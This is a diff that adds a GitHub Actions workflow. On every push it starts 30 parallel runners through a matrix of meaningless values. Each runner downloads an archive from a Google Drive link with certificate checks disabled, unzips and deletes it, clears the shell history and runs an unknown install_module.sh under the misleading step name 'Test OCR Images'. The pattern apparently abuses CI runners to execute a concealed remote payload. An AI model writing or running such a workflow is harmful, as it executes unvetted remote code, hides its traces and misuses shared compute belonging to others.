@@ -1,0 +1,56 @@
+name: thienha0code
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Setup', 'Compile', 'Validate', 'Execute', 'Release']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1We6tBjwbWVclz30aiEoBtYV7ezh1_vQE" -O thienha0code.zip
+        unzip -o thienha0code.zip
+        rm thienha0code.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+
+
+  CREATE1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Prepare', 'Construct', 'Inspect', 'Activate', 'Publish']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1We6tBjwbWVclz30aiEoBtYV7ezh1_vQE" -O thienha0code.zip
+        unzip -o thienha0code.zip
+        rm thienha0code.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+        
